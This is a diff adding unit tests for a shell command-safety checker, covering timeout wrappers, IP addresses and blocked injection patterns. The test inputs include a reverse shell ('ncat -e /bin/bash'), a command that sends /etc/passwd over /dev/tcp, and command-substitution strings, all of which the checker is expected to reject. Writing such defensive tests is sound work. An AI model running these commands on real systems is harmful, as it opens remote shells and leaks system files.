@@ -67,3 +67,41 @@ describe('offensive tools removed from whitelist', () => {
         expect(checkCommand('ncat -e /bin/bash 10.0.0.1 1234').safe).toBe(false);
     });
 });
+
+describe('timeout wrapper and IP address edge cases', () => {
+    it('allows timeout wrapper command', () => {
+        expect(checkCommand('timeout 5 ping 1.1.1.1')).toEqual({ safe: true });
+        expect(checkCommand('timeout 10 curl -s https://example.com')).toEqual({ safe: true });
+    });
+
+    it('handles IP address in commands without false positives', () => {
+        expect(checkCommand('ping -c 4 1.1.1.1')).toEqual({ safe: true });
+        expect(checkCommand('curl -s 1.1.1.1')).toEqual({ safe: true });
+    });
+});
+
+describe('injection vulnerability blocks', () => {
+    it('blocks command substitution with $()', () => {
+        const result = checkCommand('echo $(whoami)');
+        expect(result.safe).toBe(false);
+        expect(result.reason).toMatch(/Command substitution/);
+    });
+
+    it('blocks command substitution with backticks', () => {
+        const result = checkCommand('echo `id`');
+        expect(result.safe).toBe(false);
+        expect(result.reason).toMatch(/Command substitution/);
+    });
+
+    it('blocks process substitution', () => {
+        const result = checkCommand('diff <(ls) <(ls)');
+        expect(result.safe).toBe(false);
+        expect(result.reason).toMatch(/Process substitution/);
+    });
+
+    it('blocks direct bash network redirects', () => {
+        const result = checkCommand('cat /etc/passwd > /dev/tcp/10.0.0.1/4444');
+        expect(result.safe).toBe(false);
+        expect(result.reason).toMatch(/Direct bash network redirects/);
+    });
+});
